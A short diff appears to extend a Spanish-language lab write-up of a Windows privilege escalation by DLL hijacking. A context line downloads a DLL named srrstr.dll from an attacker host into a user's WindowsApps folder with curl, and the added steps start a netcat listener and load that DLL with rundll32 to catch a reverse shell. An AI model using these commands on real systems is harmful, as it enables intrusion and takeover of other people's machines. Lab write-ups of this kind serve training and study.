@@ -511,3 +511,16 @@ curl http://10.10.15.67:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microso
 ```
 
 <img width="1009" height="238" alt="image" src="https://github.com/user-attachments/assets/8e239cb9-a3ff-4425-abc6-b73543bc0ba8" />
+
+
+El siguiente paso es preparar el listener
+
+```bash
+nc -nlvp 7777
+```
+
+El siguiente paso es probar la `DLL` con `rundll32`:
+
+```powershell
+rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
+```
